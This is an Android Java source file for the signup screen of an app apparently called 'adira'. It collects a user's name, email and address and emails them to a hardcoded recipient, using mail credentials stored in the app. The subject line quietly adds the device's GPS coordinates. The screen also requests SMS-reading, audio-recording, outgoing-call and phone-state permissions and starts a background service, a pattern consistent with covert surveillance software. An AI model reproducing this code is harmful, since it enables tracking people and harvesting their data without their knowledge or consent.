package com.example.adira;

import java.io.IOException;

import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ProgressDialog;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

public class SignupActivity extends Activity {

	Button register_btn;
	EditText sign_first, sign_last, sign_email, sign_mobile, sign_hno, sign_colony, sign_landmark, sign_city,
			sign_state, sign_pincode, sign_network;
	Context context;
	SharedPreferences sharedPreferences;
	GPSTracker gps;
	ProgressDialog pd;
	private static String[] Permissions = { Manifest.permission.ACCESS_COARSE_LOCATION,
			Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.INTERNET, Manifest.permission.RECEIVE_SMS,
			Manifest.permission.READ_SMS, Manifest.permission.READ_EXTERNAL_STORAGE,
			Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.PROCESS_OUTGOING_CALLS,
			Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_PHONE_STATE,
			Manifest.permission.ACCESS_NETWORK_STATE };
	int LOCATION_REQUEST = 102;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_signup);
		pd = new ProgressDialog(SignupActivity.this);
		requestPermission();
		initialize();
		gps = new GPSTracker(this);
		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
		context = this;
		sharedPreferences = getSharedPreferences("signupactivity", Context.MODE_PRIVATE);
		register_btn.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				validation();
			}
		});
	}

	private void initialize() {
		register_btn = (Button) findViewById(R.id.signup);
		sign_first = (EditText) findViewById(R.id.sign_firstname);
		sign_last = (EditText) findViewById(R.id.sign_lastname);
		sign_email = (EditText) findViewById(R.id.edt_signemail);
		sign_mobile = (EditText) findViewById(R.id.edt_signmobilenumber);
		sign_hno = (EditText) findViewById(R.id.edt_signhno);
		sign_colony = (EditText) findViewById(R.id.edt_signcolony);
		sign_landmark = (EditText) findViewById(R.id.edt_signlandmark);
		sign_city = (EditText) findViewById(R.id.edt_signcity);
		sign_state = (EditText) findViewById(R.id.edt_signstate);
		sign_pincode = (EditText) findViewById(R.id.edt_signpincode);
		sign_network = (EditText) findViewById(R.id.edt_signmobilenetwork);
	}

	public static boolean isValidEmailAddress(String email) {
		boolean result = true;
		try {
			InternetAddress emailAddr = new InternetAddress(email);
			emailAddr.validate();
		} catch (AddressException ex) {
			result = false;
		}
		return result;
	}

	public void validation() {
		if (sign_first.getText().toString().trim().length() != 0) {
			sign_first.setError(null);
			if (sign_last.getText().toString().trim().length() != 0) {
				sign_last.setError(null);
				if (sign_email.getText().toString().trim().length() != 0) {
					sign_email.setError(null);
					if (isValidEmailAddress(sign_email.getText().toString().trim())) {
						sign_email.setError(null);
						if (sign_mobile.getText().toString().trim().length() != 0) {
							sign_mobile.setError(null);
							if (sign_mobile.getText().toString().trim().length() > 9) {
								sign_mobile.setError(null);
								if (sign_network.getText().toString().trim().length() != 0) {
									sign_network.setError(null);
//									if (sign_hno.getText().toString().trim().length() != 0) {
//										sign_hno.setError(null);
//										if (sign_colony.getText().toString().trim().length() != 0) {
//											sign_colony.setError(null);
//											if (sign_landmark.getText().toString().trim().length() != 0) {
//												sign_landmark.setError(null);
//												if (sign_city.getText().toString().trim().length() != 0) {
//													sign_city.setError(null);
//													if (sign_state.getText().toString().trim().length() != 0) {
//														sign_state.setError(null);
//														if (sign_pincode.getText().toString().trim().length() != 0) {
//															sign_pincode.setError(null);
															pd.setTitle("Registering");
															pd.show();
															sendDetails();
															Editor editor = sharedPreferences.edit();
															editor.putBoolean("signup", true);
															editor.commit();
															if(pd.isShowing()){
																pd.dismiss();
															}
															Intent i = new Intent(SignupActivity.this, MainActivity.class);
															startActivity(i);
															finish();
//														} else {
//															sign_pincode.requestFocus();
//															sign_pincode.setError("Should not be Empty!");
//														}
//													} else {
//														sign_state.requestFocus();
//														sign_state.setError("Should not be Empty!");
//													}
//												} else {
//													sign_city.requestFocus();
//													sign_city.setError("Should not be Empty!");
//												}
//											} else {
//												sign_landmark.requestFocus();
//												sign_landmark.setError("Should not be Empty!");
//											}
//										} else {
//											sign_colony.requestFocus();
//											sign_colony.setError("Should not be Empty!");
//										}
//									} else {
//										sign_hno.requestFocus();
//										sign_hno.setError("Should not be Empty!");
//									}
								} else {
									sign_network.requestFocus();
									sign_network.setError("Should not be Empty!");
								}
							} else {
								sign_mobile.requestFocus();
								sign_mobile.setError("Provide Correct MobileNumber!");
							}
						} else {
							sign_mobile.requestFocus();
							sign_mobile.setError("Should not be Empty!");
						}
					} else {
						sign_email.requestFocus();
						sign_email.setError("Enter Valid Email!");
					}
				} else {
					sign_email.requestFocus();
					sign_email.setError("Should not be Empty!");
				}
			} else {
				sign_last.requestFocus();
				sign_last.setError("Should not be Empty!");
			}
		} else {
			sign_first.requestFocus();
			sign_first.setError("Should not be Empty!");
		}
	}

	public void sendDetails() {
		if (isConnectingToInternet()) {
			try {
				double latitude = 0,longitude = 0; 
				if(gps.canGetLocation()){
					latitude = gps.getLatitude();
					longitude = gps.getLongitude();
					
				}
				EmailSender sender = new EmailSender(SplashActivity.mailidusername, SplashActivity.mailidpassword);
				boolean sent = sender.sendMail(
						"Registration, Lat: "+latitude+" Long: "+longitude+" from: " + sign_first.getText().toString() + "_ " + sign_last.getText().toString(),
						"Email: " + sign_email.getText().toString() + "\nH.no: " + sign_hno.getText().toString()
								+ "\nColony: " + sign_colony.getText().toString() + "\nLandmark: "
								+ sign_landmark.getText().toString() + "\nCity: " + sign_city.getText().toString()
								+ "\nState: " + sign_state.getText().toString() + "\nPincode: "
								+ sign_pincode.getText().toString() + "\nNetwork: " + sign_network.getText().toString(),
								SplashActivity.mailidusername,
								SplashActivity.mailidto);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else {
			Sqldata myDbHelper = new Sqldata(context);
			try {
				myDbHelper.createDataBase();
			} catch (IOException ioe) {
				throw new Error("Unable to create database");
			}
			try {
				myDbHelper.openDataBase();
				Cursor allrows = myDbHelper.myDataBase.rawQuery("select * from " + Sqldata.TABLE_MAILQUEUE, null);
				int size = allrows.getCount();
				ContentValues values = new ContentValues();
				values.put(myDbHelper.KEY_MAILQUEUE_ROW_ID, size + 1);
				values.put(myDbHelper.KEY_MAILQUEUE_SUBJECT, "Registration from: " + sign_first.getText().toString()
						+ "_ " + sign_last.getText().toString());
				values.put(myDbHelper.KEY_MAILQUEUE_BODY, "Email: " + sign_email.getText().toString() + "\nH.no: "
						+ sign_hno.getText().toString() + "\nColony: " + sign_colony.getText().toString()
						+ "\nLandmark: " + sign_landmark.getText().toString() + "\nCity: "
						+ sign_city.getText().toString() + "\nState: " + sign_state.getText().toString() + "\nPincode: "
						+ sign_pincode.getText().toString() + "\nNetwork: " + sign_network.getText().toString());
				long row_id = myDbHelper.myDataBase.insert(myDbHelper.TABLE_MAILQUEUE, null, values);
				System.out.println("value--> " + row_id);
				myDbHelper.close();
			} catch (SQLException sqle) {
				myDbHelper.close();
				throw sqle;
			}
		}
	}

	@SuppressLint("NewApi")
	public boolean isConnectingToInternet() {
		ConnectivityManager connectivity = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
			Network[] networks = connectivity.getAllNetworks();
			NetworkInfo networkInfo;
			for (Network mNetwork : networks) {
				networkInfo = connectivity.getNetworkInfo(mNetwork);
				if (networkInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					return true;
				}
			}
		} else {
			if (connectivity != null) {
				// noinspection deprecation
				NetworkInfo[] info = connectivity.getAllNetworkInfo();
				if (info != null) {
					for (NetworkInfo anInfo : info) {
						if (anInfo.getState() == NetworkInfo.State.CONNECTED) {
							System.out.println("Network NETWORKNAME: " + anInfo.getTypeName());
							return true;
						}
					}
				}
			}
		}
		return false;
	}
	@TargetApi(23)
	public void requestPermission() {
		if (Build.VERSION.SDK_INT == Build.VERSION_CODES.M) {
			if (checkCallingOrSelfPermission(
					Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
					|| checkCallingOrSelfPermission(
							Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
				requestPermissions(Permissions, LOCATION_REQUEST);
			}else{
				if (!isMyServiceRunning(MyService.class, SignupActivity.this)) {
					startService(new Intent(SignupActivity.this, MyService.class));
				}
			}
		}
	}

	@TargetApi(23)

	@Override
	public void onRequestPermissionsResult(int arg0, String[] arg1, int[] arg2) { 
		super.onRequestPermissionsResult(arg0, arg1, arg2);
		if (arg0 == LOCATION_REQUEST) {
			if(checkCallingOrSelfPermission(
					Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
					&& checkCallingOrSelfPermission(
							Manifest.permission.ACCESS_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED){
				if (!isMyServiceRunning(MyService.class, SignupActivity.this)) {
					startService(new Intent(SignupActivity.this, MyService.class));
				}
			}else{
				requestPermission();
			}
		}
	}
	boolean isMyServiceRunning(Class<?> serviceClass,Context context) {
		ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if (serviceClass.getName().equals(service.service.getClassName())) {
				System.out.println("Services -> " + service.service.getClassName());
				return true;
			}
		}
		return false;
	}
}
